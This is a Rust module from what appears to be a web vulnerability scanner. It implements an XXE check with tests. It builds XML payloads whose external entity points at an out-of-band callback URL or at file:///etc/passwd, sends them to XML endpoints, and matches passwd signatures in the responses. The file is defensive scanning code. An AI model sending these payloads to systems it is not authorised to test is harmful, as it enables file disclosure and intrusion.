//! XML External Entity (XXE) active scan check.
//!
//! Only runs against targets that actually look like they're consuming
//! XML — everything else is skipped with zero probes, since sending a
//! `<!DOCTYPE ...>` payload to a JSON/form endpoint is both wasted traffic
//! and very unlikely to be parsed as XML by anything downstream.
//!
//! Like `checks::ssrf`, XXE is split into two independent detection
//! strategies, because a vulnerable parser resolving an external entity
//! doesn't necessarily reflect anything back into the HTTP response:
//!
//!   1. **OOB confirmation** (ground truth, when available). The injected
//!      `<!ENTITY xxe SYSTEM "...">` points at an [`crate::oob`] token URL.
//!      If the target's XML parser actually resolves the entity, it makes
//!      an outbound request that shows up as a DNS lookup on our listener.
//!      `Severity::Critical`.
//!   2. **Local file read** (works with no OOB domain configured). A
//!      separate probe points the entity at `file:///etc/passwd` and
//!      checks whether its contents come back in the response body, reusing
//!      the exact signature list `checks::traversal` already uses for its
//!      own file-disclosure detection (`unix`/`win.ini` style markers) —
//!      "the file got read and reflected" looks the same regardless of
//!      whether path traversal or an XML entity was the delivery mechanism.
//!      `Severity::Critical`.
//!
//! # A note on payload fidelity
//!
//! This check replaces the target's entire request body with a small,
//! self-contained XML document carrying the malicious `DOCTYPE` — it does
//! not attempt to graft the entity declaration into the original body's
//! actual schema. That's a deliberate simplification: we don't know ahead
//! of time whether the original document expects a `SOAP-ENV:Envelope`, a
//! bespoke root element, or something else, and most XML parsers will
//! attempt to resolve an external entity during parsing regardless of what
//! the surrounding document structure is (or isn't) expecting. The
//! trade-off is that endpoints doing strict schema/DTD validation *before*
//! entity resolution could reject our probe outright and produce a false
//! negative — acceptable for an automated scanner check, where the OOB
//! phase in particular still fires as long as parsing gets far enough to
//! touch the entity.

use async_trait::async_trait;
use reqwest::Client;
use std::time::Duration;

use crate::checks::traversal::SUCCESS_SIGNATURES;
use crate::logger;
use crate::oob::OobChannel;
use crate::scanner::{ScanCheck, ScanFinding, ScanTarget, Severity};

/// Delay between the OOB probe and the local-file-read probe against the
/// same target. Mirrors the throttling convention in `sqli.rs`/`ssrf.rs`.
const PROBE_DELAY: Duration = Duration::from_millis(300);

/// How long to wait, after sending the OOB probe, before starting to poll
/// for a DNS hit. See `checks::ssrf` for the identical rationale.
const OOB_SHORT_DELAY: Duration = Duration::from_millis(500);

/// Total time budget given to `OobChannel::was_triggered`, on top of
/// `OOB_SHORT_DELAY`.
const OOB_WAIT_TIMEOUT: Duration = Duration::from_secs(8);

/// External entity target for the local-file-read probe. `/etc/passwd` is
/// world-readable on essentially every Unix-like system, making it a safe,
/// universally-present canary — mirrors `traversal.rs`'s choice of the same
/// file for the same reason.
const LOCAL_FILE_URI: &str = "file:///etc/passwd";

pub struct XxeCheck {
    /// `None` when no OOB domain is configured — phase 1 (OOB confirmation)
    /// is then skipped and only the local-file-read probe (phase 2) runs.
    oob: Option<OobChannel>,
}

impl XxeCheck {
    /// `oob`, when present, must be a channel bound to a domain the
    /// operator controls — see `crate::oob`'s module docs. Pass `None` to
    /// run this check with only the local-file-read probe; the OOB
    /// confirmation phase is skipped entirely in that case.
    pub fn new(oob: Option<OobChannel>) -> Self {
        Self { oob }
    }

    /// `true` if any header named `Content-Type` (case-insensitive) names
    /// an XML media type.
    fn looks_like_xml_content_type(headers: &[(String, String)]) -> bool {
        headers.iter().any(|(k, v)| {
            k.eq_ignore_ascii_case("content-type") && {
                let vl = v.to_lowercase();
                vl.contains("application/xml") || vl.contains("text/xml") || vl.contains("+xml")
            }
        })
    }

    /// `true` if `body` looks like it starts an XML document — either a
    /// literal `<?xml` prolog, or simply opens with `<` and closes with
    /// `>` somewhere (loose on purpose: plenty of real XML bodies, e.g.
    /// SOAP envelopes forwarded without a prolog, skip the `<?xml ...?>`
    /// declaration entirely).
    fn looks_xml_shaped(body: &[u8]) -> bool {
        if body.is_empty() {
            return false;
        }
        let text = String::from_utf8_lossy(body);
        let trimmed = text.trim();
        trimmed.starts_with("<?xml") || (trimmed.starts_with('<') && trimmed.ends_with('>'))
    }

    /// Combines both signals: run the check if either the declared
    /// Content-Type or the body shape says "this is XML".
    fn is_xml_target(target: &ScanTarget) -> bool {
        Self::looks_like_xml_content_type(&target.headers) || Self::looks_xml_shaped(&target.body)
    }

    /// Build a minimal, self-contained XML document whose external entity
    /// resolves to `entity_uri`. See the module-level "payload fidelity"
    /// note for why this doesn't try to preserve the original body's
    /// schema.
    fn build_payload(entity_uri: &str) -> String {
        format!(
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\
             <!DOCTYPE cogitator [<!ENTITY xxe SYSTEM \"{entity_uri}\">]>\n\
             <cogitator>&xxe;</cogitator>"
        )
    }

    /// Scan `body` for any of `traversal.rs`'s file-disclosure signatures.
    /// Returns the first matching signature together with up to 200 chars
    /// of context starting at the match, if found. Deliberately reuses
    /// `traversal::SUCCESS_SIGNATURES` (rather than a second, hand-copied
    /// list) — see that module's doc comment on the constant.
    fn find_success_signature(body: &str) -> Option<(&'static str, String)> {
        for sig in SUCCESS_SIGNATURES {
            if let Some(idx) = body.find(sig) {
                let evidence: String = body[idx..].chars().take(200).collect();
                return Some((sig, evidence));
            }
        }
        None
    }

    /// Send `target`'s request with its body replaced wholesale by
    /// `payload` (and its `Content-Type` header forced to
    /// `application/xml`, since we're sending a fresh XML document
    /// regardless of what the original body's encoding was). Returns
    /// `(request_raw, status, body)`; network/parse failures yield `None`
    /// so the caller can simply skip this probe.
    async fn probe(
        client: &Client,
        target: &ScanTarget,
        payload: &str,
    ) -> Option<(String, Option<u16>, String)> {
        let method = target.method.to_uppercase();
        let mut req = client.request(
            method.parse().unwrap_or(reqwest::Method::POST),
            &target.url,
        );

        for (k, v) in &target.headers {
            if k.eq_ignore_ascii_case("content-type") {
                continue; // overridden below — we're sending fresh XML
            }
            req = req.header(k.as_str(), v.as_str());
        }
        req = req.header("Content-Type", "application/xml").body(payload.to_string());

        let request_raw = format!("{} {} body={}", method, target.url, payload);

        match req.send().await {
            Ok(resp) => {
                let status = Some(resp.status().as_u16());
                match resp.text().await {
                    Ok(body) => Some((request_raw, status, body)),
                    Err(e) => {
                        logger::debug(&format!("xxe check: failed to read response body: {e}"));
                        None
                    }
                }
            }
            Err(e) => {
                logger::debug(&format!("xxe check: request failed: {e}"));
                None
            }
        }
    }
}

#[async_trait]
impl ScanCheck for XxeCheck {
    fn name(&self) -> &str {
        "XML External Entity (XXE)"
    }

    async fn check(&self, client: &Client, target: &ScanTarget) -> Vec<ScanFinding> {
        let mut findings = Vec::new();

        if !Self::is_xml_target(target) {
            return findings;
        }

        // ── Phase 1: OOB confirmation (skipped entirely if no OOB domain
        // is configured) ───────────────────────────────────────────────────
        if let Some(oob) = &self.oob {
            let token = oob.new_token();
            let oob_uri = format!("http://{}/", oob.full_domain(&token));
            let oob_payload = Self::build_payload(&oob_uri);

            if let Some((request_raw, _status, _body)) = Self::probe(client, target, &oob_payload).await {
                tokio::time::sleep(OOB_SHORT_DELAY).await;

                if oob.was_triggered(&token, OOB_WAIT_TIMEOUT).await {
                    logger::warn(&format!(
                        "xxe check: OOB interaction confirmed (token {token}) on {}",
                        target.url
                    ));

                    findings.push(ScanFinding {
                        check_name: format!("{} (OOB confirmed)", self.name()),
                        severity: Severity::Critical,
                        evidence: format!(
                            "target resolved OOB token subdomain '{}' — confirms the XML parser resolved \
                             an attacker-supplied external entity",
                            oob.full_domain(&token)
                        ),
                        request_raw,
                        response_snippet: String::new(),
                        url: target.url.clone(),
                        parameter: None,
                    });
                }
            }

            tokio::time::sleep(PROBE_DELAY).await;
        }

        // ── Phase 2: local file read ──────────────────────────────────────
        let file_payload = Self::build_payload(LOCAL_FILE_URI);

        if let Some((request_raw, _status, body)) = Self::probe(client, target, &file_payload).await {
            if let Some((sig, evidence)) = Self::find_success_signature(&body) {
                logger::warn(&format!(
                    "xxe check: local file disclosure via external entity on {} — matched signature '{sig}'",
                    target.url
                ));

                findings.push(ScanFinding {
                    check_name: format!("{} (local file read)", self.name()),
                    severity: Severity::Critical,
                    evidence,
                    request_raw,
                    response_snippet: body.chars().take(200).collect(),
                    url: target.url.clone(),
                    parameter: None,
                });
            }
        }

        findings
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // ── target detection ────────────────────────────────────────────────────

    #[test]
    fn content_type_header_marks_target_as_xml() {
        let target = ScanTarget {
            url: "https://example.com/api".to_string(),
            method: "POST".to_string(),
            params: Vec::new(),
            headers: vec![("Content-Type".to_string(), "application/xml; charset=utf-8".to_string())],
            body: Vec::new(),
        };
        assert!(XxeCheck::is_xml_target(&target));
    }

    #[test]
    fn content_type_header_is_case_insensitive() {
        let target = ScanTarget {
            url: "https://example.com/api".to_string(),
            method: "POST".to_string(),
            params: Vec::new(),
            headers: vec![("content-type".to_string(), "text/xml".to_string())],
            body: Vec::new(),
        };
        assert!(XxeCheck::is_xml_target(&target));
    }

    #[test]
    fn xml_shaped_body_without_content_type_is_detected() {
        let target = ScanTarget {
            url: "https://example.com/api".to_string(),
            method: "POST".to_string(),
            params: Vec::new(),
            headers: Vec::new(),
            body: b"<?xml version=\"1.0\"?><root><a>1</a></root>".to_vec(),
        };
        assert!(XxeCheck::is_xml_target(&target));
    }

    #[test]
    fn xml_shaped_body_without_prolog_is_still_detected() {
        // SOAP-style bodies often skip the <?xml ...?> declaration.
        let target = ScanTarget {
            url: "https://example.com/api".to_string(),
            method: "POST".to_string(),
            params: Vec::new(),
            headers: Vec::new(),
            body: b"<soap:Envelope><soap:Body/></soap:Envelope>".to_vec(),
        };
        assert!(XxeCheck::is_xml_target(&target));
    }

    #[test]
    fn json_target_is_not_xml() {
        let target = ScanTarget {
            url: "https://example.com/api".to_string(),
            method: "POST".to_string(),
            params: Vec::new(),
            headers: vec![("Content-Type".to_string(), "application/json".to_string())],
            body: b"{\"a\":1}".to_vec(),
        };
        assert!(!XxeCheck::is_xml_target(&target));
    }

    #[test]
    fn empty_body_and_no_content_type_is_not_xml() {
        let target = ScanTarget {
            url: "https://example.com/api".to_string(),
            method: "GET".to_string(),
            params: vec![("q".to_string(), "1".to_string())],
            headers: Vec::new(),
            body: Vec::new(),
        };
        assert!(!XxeCheck::is_xml_target(&target));
    }

    #[test]
    fn form_urlencoded_target_is_not_xml() {
        let target = ScanTarget {
            url: "https://example.com/api".to_string(),
            method: "POST".to_string(),
            params: Vec::new(),
            headers: vec![(
                "Content-Type".to_string(),
                "application/x-www-form-urlencoded".to_string(),
            )],
            body: b"a=1&b=2".to_vec(),
        };
        assert!(!XxeCheck::is_xml_target(&target));
    }

    // ── payload construction ─────────────────────────────────────────────────

    #[test]
    fn build_payload_embeds_entity_uri() {
        let payload = XxeCheck::build_payload("http://abc123.oob.example.com/");
        assert!(payload.contains("SYSTEM \"http://abc123.oob.example.com/\""));
        assert!(payload.contains("&xxe;"));
        assert!(payload.contains("<!DOCTYPE"));
    }

    // ── file-read signature detection (reusing traversal::SUCCESS_SIGNATURES) ─

    #[test]
    fn finds_unix_passwd_signature() {
        let body = "root:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin";
        let (sig, evidence) = XxeCheck::find_success_signature(body).unwrap();
        assert_eq!(sig, "root:x:");
        assert!(evidence.starts_with("root:x:"));
    }

    #[test]
    fn no_signature_returns_none() {
        let body = "Everything is fine, nothing to see here.";
        assert!(XxeCheck::find_success_signature(body).is_none());
    }

    #[test]
    fn evidence_capped_at_200_chars() {
        let tail = "x".repeat(500);
        let body = format!("root:x:{}", tail);
        let (_, evidence) = XxeCheck::find_success_signature(&body).unwrap();
        assert_eq!(evidence.chars().count(), 200);
    }
}